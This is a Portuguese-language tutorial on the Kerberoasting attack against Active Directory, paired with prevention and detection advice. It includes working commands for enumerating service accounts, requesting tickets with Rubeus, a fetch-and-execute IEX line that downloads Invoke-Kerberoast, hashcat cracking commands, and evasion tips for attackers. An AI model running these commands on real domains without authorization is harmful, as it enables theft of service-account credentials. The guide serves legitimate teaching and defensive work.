# 🎫 Kerberoasting - Teoria Completa

> Entendendo o ataque Kerberoasting: como funciona, como detectar e como prevenir

---

## 📚 O que é Kerberoasting?

**Kerberoasting** é uma técnica de ataque pós-exploração contra Active Directory que permite a um atacante autenticado extrair hashes de senhas de contas de serviço (service accounts) e tentar quebrá-los offline.

### Por que funciona?
- 🎫 Qualquer usuário autenticado pode solicitar tickets Kerberos
- 🔐 Tickets de serviço são criptografados com a senha da conta de serviço
- 💻 Crackear pode ser feito offline (sem gerar alertas)
- ⏰ Sem limite de tentativas ou lockout

### Atualizacao moderna (2024-2026)

- `RC4_HMAC` (etype 23) ainda e o caminho preferido por atacantes porque hashcat tem modo `13100` rapido. Microsoft anunciou *deprecation* mas muitos ambientes mantem fallback.
- `AES256_CTS_HMAC_SHA1_96` (etype 18) cracking e ordens de magnitude mais lento (`-m 19700` no hashcat).
- Tools modernas: `GetUserSPNs.py` (Impacket), `nxc ldap --kerberoasting` (NetExec), `Rubeus.exe kerberoast`.
- Deteccao moderna: `4769` com `Ticket Encryption Type=0x17 (RC4)` em logon servers + correlacao com Service Account.

⚠️ **IMPORTANTE**: Este conteúdo é puramente educacional. Use apenas em ambientes autorizados!

---

## 🔑 Conceitos de Kerberos

### Componentes Principais

```
Kerberos Authentication:
├─ Client (usuário/máquina)
├─ KDC (Key Distribution Center) - no Domain Controller
│  ├─ AS (Authentication Service)
│  └─ TGS (Ticket Granting Service)
├─ TGT (Ticket Granting Ticket)
└─ Service Ticket (ST)
```

### Fluxo Normal de Autenticação

```
1. Cliente → AS: "Quero me autenticar"
   └─ Envia credenciais (hash NTLM)

2. AS → Cliente: TGT (Ticket Granting Ticket)
   └─ Criptografado com chave do krbtgt

3. Cliente → TGS: "Quero acessar SERVIÇO_X" + TGT
   └─ Solicita Service Ticket

4. TGS → Cliente: Service Ticket (ST)
   └─ Criptografado com senha da conta de serviço

5. Cliente → Serviço: Service Ticket
   └─ Serviço valida e concede acesso
```

**O problema:** O Service Ticket (passo 4) é criptografado com a senha da conta de serviço e pode ser solicitado por qualquer usuário autenticado!

---

## 🎯 Como Funciona o Kerberoasting

### Passo a Passo do Ataque

```
FASE 1: ENUMERAÇÃO
┌─────────────────────────────────────┐
│ Identificar contas com SPN          │
│ (Service Principal Name)            │
└─────────────────────────────────────┘
         ↓
FASE 2: SOLICITAÇÃO
┌─────────────────────────────────────┐
│ Solicitar Service Tickets para      │
│ todas as contas com SPN              │
└─────────────────────────────────────┘
         ↓
FASE 3: EXTRAÇÃO
┌─────────────────────────────────────┐
│ Extrair tickets da memória          │
│ Converter para formato hashcat      │
└─────────────────────────────────────┘
         ↓
FASE 4: CRACKING
┌─────────────────────────────────────┐
│ Quebrar hashes offline com          │
│ ferramentas (hashcat, john)         │
└─────────────────────────────────────┘
```

---

## 🛠️ Identificando Alvos (Enumeração de SPNs)

### O que é SPN?

**Service Principal Name (SPN)** é um identificador único para um serviço em um domínio Active Directory.

**Formato:** `Serviço/Host:Porta`

**Exemplos:**
```
MSSQLSvc/sql-server.exemplo.local:1433
HTTP/web.exemplo.local
CIFS/fileserver.exemplo.local
LDAP/dc01.exemplo.local
```

---

### Enumerando SPNs

#### PowerShell Nativo
```powershell
# Listar usuários com SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | Select-Object SamAccountName, ServicePrincipalName

# Usando SetSPN (built-in)
setspn -Q */*
```

#### PowerView
```powershell
# Importar PowerView
Import-Module .\PowerView.ps1

# Listar usuários com SPN
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Filtrar por tipo de serviço
Get-DomainUser -SPN | Where-Object {$_.serviceprincipalname -match "MSSQLSvc"}
```

#### Rubeus (ferramenta C#)
```powershell
# Listar SPNs
.\Rubeus.exe kerberoast /stats
```

---

## 🎫 Solicitando Service Tickets

### Usando PowerShell

```powershell
# Add-Type para trabalhar com Kerberos
Add-Type -AssemblyName System.IdentityModel

# Solicitar ticket para um SPN específico
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql-server.exemplo.local:1433"

# Verificar tickets em memória
klist
```

### Usando Rubeus
```powershell
# Kerberoast automático (solicita todos os tickets)
.\Rubeus.exe kerberoast

# Kerberoast com output em formato hashcat
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Kerberoast de usuário específico
.\Rubeus.exe kerberoast /user:svc_sql

# Kerberoast com formato John the Ripper
.\Rubeus.exe kerberoast /format:john
```

### Usando Invoke-Kerberoast (PowerShell)
```powershell
# Baixar e importar
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')

# Executar
Invoke-Kerberoast -OutputFormat Hashcat | fl

# Salvar em arquivo
Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv -NoTypeInformation kerberoast_hashes.csv
```

---

## 💻 Extraindo e Formatando Hashes

### Formato do Hash

**Estrutura do Service Ticket hash:**
```
$krb5tgs$23$*usuário$realm$SPN*$hash...
```

**Exemplo:**
```
$krb5tgs$23$*svc_sql$EXEMPLO.LOCAL$MSSQLSvc/sql-server.exemplo.local:1433*$a1b2c3...
```

**Breakdown:**
- `$krb5tgs$23$` - Tipo de hash (Kerberos TGS-REP, RC4)
- `*svc_sql$` - Nome da conta de serviço
- `EXEMPLO.LOCAL$` - Domínio
- `MSSQLSvc/....*` - SPN
- `$a1b2c3...` - Hash criptografado

---

### Tipos de Criptografia

| Tipo | Descrição | Força | Preferência |
|------|-----------|-------|-------------|
| **RC4 (tipo 23)** | Mais fraco, baseado em NTLM | Baixa | ✅ Preferido por atacantes |
| **AES128 (tipo 17)** | Mais forte | Média | ⚠️ Mais difícil de quebrar |
| **AES256 (tipo 18)** | Mais forte ainda | Alta | ⚠️ Muito difícil de quebrar |

**Dica:** Atacantes preferem RC4 porque é mais fácil de quebrar.

---

## 🔓 Quebrando os Hashes

### Usando Hashcat

```bash
# Modo 13100 = Kerberos 5 TGS-REP etype 23 (RC4)
hashcat -m 13100 hashes.txt rockyou.txt

# Com regras
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule

# Modo 19600 = Kerberos 5 TGS-REP etype 17 (AES128)
hashcat -m 19600 hashes_aes128.txt wordlist.txt

# Modo 19700 = Kerberos 5 TGS-REP etype 18 (AES256)
hashcat -m 19700 hashes_aes256.txt wordlist.txt

# Otimizações
hashcat -m 13100 hashes.txt rockyou.txt -O  # Otimizar para GPU
hashcat -m 13100 hashes.txt rockyou.txt -w 3  # Workload profile (1-4)
```

### Usando John the Ripper

```bash
# Crackear com John
john --wordlist=rockyou.txt hashes.txt

# Mostrar senhas quebradas
john --show hashes.txt

# Com regras
john --wordlist=rockyou.txt --rules hashes.txt
```

---

### Wordlists Recomendadas

```
Wordlists Populares:
├─ rockyou.txt (mais comum)
├─ crackstation.txt
├─ SecLists/Passwords/
│  ├─ Common-Credentials/
│  └─ Leaked-Databases/
└─ Custom wordlists baseadas em:
   ├─ Nome da empresa
   ├─ Termos do setor
   └─ Passwords comuns corporativas
```

---

## 🎯 Alvos de Alto Valor

### Contas Mais Valiosas

```
Prioridade de Ataque:
1. ⭐⭐⭐ Contas de serviço de SQL Server
   └─ Frequentemente têm privilégios altos

2. ⭐⭐⭐ Contas de serviço de IIS/Web
   └─ Acesso a aplicações web

3. ⭐⭐ Contas de backup
   └─ Acesso a dados sensíveis

4. ⭐⭐ Contas de integração
   └─ Conexão entre sistemas

5. ⭐ Outras contas de serviço
   └─ Podem ter permissões úteis
```

---

### Identificando Alvos Valiosos

```powershell
# PowerView - usuários com SPN e membros de grupos privilegiados
Get-DomainUser -SPN | ?{$_.memberof -match 'Domain Admins'}

# Contas de serviço com AdminCount=1 (privilegiadas)
Get-DomainUser -SPN -Properties admincount | ?{$_.admincount -eq 1}

# Contas de serviço que não mudaram senha recentemente
$date = (Get-Date).AddYears(-2)
Get-DomainUser -SPN | ?{$_.pwdlastset -lt $date}
```

---

## 🛡️ Defesas e Detecção

### Como Prevenir Kerberoasting

#### 1. Senhas Fortes em Contas de Serviço
```
Requisitos:
├─ Mínimo 25 caracteres
├─ Complexidade alta (maiúsculas, minúsculas, números, símbolos)
├─ Aleatórias (não baseadas em palavras)
└─ Rotação regular
```

#### 2. Managed Service Accounts (MSA)

```powershell
# Criar Group Managed Service Account (gMSA)
New-ADServiceAccount -Name "gMSA_SQL" -DNSHostName "sql.exemplo.local" -PrincipalsAllowedToRetrieveManagedPassword "SQL_Servers"

# Instalar em servidor
Install-ADServiceAccount -Identity "gMSA_SQL"

# Usar como conta de serviço
# Senha é gerenciada automaticamente pelo AD (120 caracteres, rotação automática)
```

**Vantagens:**
- ✅ Senha de 120+ caracteres
- ✅ Rotação automática
- ✅ Impossível de kerberoast efetivamente

---

#### 3. AES Encryption (ao invés de RC4)

```powershell
# Forçar AES256 para contas de serviço
Set-ADAccountControl -Identity "svc_sql" -DoesNotRequirePreAuth $false
Set-ADUser -Identity "svc_sql" -Add @{'msDS-SupportedEncryptionTypes'=24}  # AES256

# Desabilitar RC4 no domínio (via GPO)
# Computer Configuration → Policies → Windows Settings → Security Settings → 
# Local Policies → Security Options → Network security: Configure encryption types allowed for Kerberos
```

---

#### 4. Princípio do Menor Privilégio

```
Boas Práticas:
├─ Contas de serviço NÃO devem ser Domain Admins
├─ Dar apenas permissões necessárias
├─ Usar contas diferentes para cada serviço
└─ Evitar reutilização de senhas
```

---

### Como Detectar Kerberoasting

#### Event IDs Importantes

```
Windows Security Logs:
├─ Event ID 4769: Kerberos Service Ticket Request
│  └─ Ticket Encryption Type: 0x17 (RC4) é suspeito
│  └─ Múltiplos requests em curto período
│
├─ Event ID 4770: Kerberos Service Ticket Renewed
│
└─ Event ID 4771: Kerberos Pre-Authentication Failed
```

---

#### Detecção com SIEM

```python
# Exemplo de regra de detecção (pseudocódigo)

IF Event_ID == 4769:
    IF Encryption_Type == "0x17" (RC4):
        IF Requests > 10 em 5 minutos:
            ALERTA: Possível Kerberoasting
    
    IF Service_Name não está em whitelist:
        ALERTA: Solicitação de ticket incomum
```

---

#### Honeypot Accounts

```powershell
# Criar conta "isca" com SPN
New-ADUser -Name "svc_honeypot_kerberoast" -AccountPassword (ConvertTo-SecureString "NuncaSeraUsada123!" -AsPlainText -Force) -Enabled $true

# Adicionar SPN falso
setspn -A HTTP/fake-service.exemplo.local svc_honeypot_kerberoast

# Monitorar tickets solicitados para esta conta
# Qualquer request = Kerberoasting em andamento!
```

---

## 📊 Comparação: Kerberoasting vs AS-REP Roasting

| Aspecto | Kerberoasting | AS-REP Roasting |
|---------|---------------|-----------------|
| **Alvo** | Contas com SPN | Contas sem pre-auth |
| **Requisito** | Usuário autenticado | Nenhum (pode ser anônimo) |
| **Hash obtido** | TGS-REP | AS-REP |
| **Detecção** | Event 4769 | Event 4768 |
| **Prevalência** | Comum | Raro |
| **Mitigação** | MSAs, senhas fortes | Habilitar pre-auth |

---

## 🎓 Hands-On: Passo a Passo Completo

### Cenário: Lab de Aprendizado

```powershell
# 1. ENUMERAÇÃO
# Encontrar usuários com SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# 2. SOLICITAR TICKETS
# Usando Rubeus
.\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt

# 3. VERIFICAR FORMATO
# Abrir kerberoast_hashes.txt e verificar se está em formato hashcat

# 4. CRACKEAR (em máquina Linux)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# 5. VERIFICAR RESULTADOS
hashcat -m 13100 kerberoast_hashes.txt --show
```

---

### Criando Lab de Teste

```powershell
# Criar conta de serviço vulnerável (apenas para labs!)
New-ADUser -Name "svc_test" -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force) -PasswordNeverExpires $true -Enabled $true

# Adicionar SPN
setspn -A MSSQLSvc/testserver.lab.local:1433 svc_test

# Testar Kerberoasting
.\Rubeus.exe kerberoast /user:svc_test

# Limpar depois
Remove-ADUser -Identity "svc_test" -Confirm:$false
```

---

## 💡 Dicas e Truques

### Para Atacantes (Red Team)

```
1. Priorize RC4
   └─ Força downgrade de encryption se possível

2. Seja discreto
   └─ Evite solicitar todos os tickets de uma vez
   └─ Randomize timing

3. Foque em contas antigas
   └─ pwdlastset antigo = senha provavelmente fraca

4. Use custom wordlists
   └─ Nome da empresa + variações
   └─ Padrões comuns corporativos
```

### Para Defensores (Blue Team)

```
1. Monitore Event 4769
   └─ RC4 requests
   └─ Volume anormal

2. Implemente MSAs/gMSAs
   └─ Elimina o vetor de ataque

3. Force AES encryption
   └─ Desabilite RC4 via GPO

4. Senhas > 25 caracteres
   └─ Torna cracking impraticável

5. Honey accounts
   └─ Detecção precoce
```

---

## 🚨 Sinais de Kerberoasting em Andamento

```
Red Flags:
├─ Múltiplos Event ID 4769 em curto período
├─ Solicitações de tickets para SPNs incomuns
├─ RC4 encryption quando AES está disponível
├─ Usuário solicitando tickets para muitos serviços
├─ Tickets solicitados fora do horário comercial
└─ PowerView.ps1 ou Rubeus.exe detectados
```

---

## 📚 Recursos Adicionais

### Ferramentas

| Ferramenta | Tipo | Link |
|------------|------|------|
| **Rubeus** | C# offensive | GitHub: GhostPack/Rubeus |
| **Invoke-Kerberoast** | PowerShell | Empire Framework |
| **Hashcat** | Password cracker | hashcat.net |
| **John the Ripper** | Password cracker | openwall.com/john |

### Labs Práticos

- **HackTheBox**: Active, Sauna, Forest
- **TryHackMe**: Attacktive Directory
- **PentesterLab**: Kerberos exercises

### Leituras

- "Kerberoasting Without Mimikatz" - harmj0y
- "Detecting Kerberoasting Activity" - Microsoft
- "AD Security Best Practices" - adsecurity.org

---

<div align="center">

**🎫 Kerberoasting é um dos ataques AD mais efetivos**

*Defesa: MSAs + senhas fortes + monitoramento*

*Detecção: Event 4769 + honeypot accounts*

---

*Conteúdo educacional | Use apenas em ambientes autorizados*

</div>
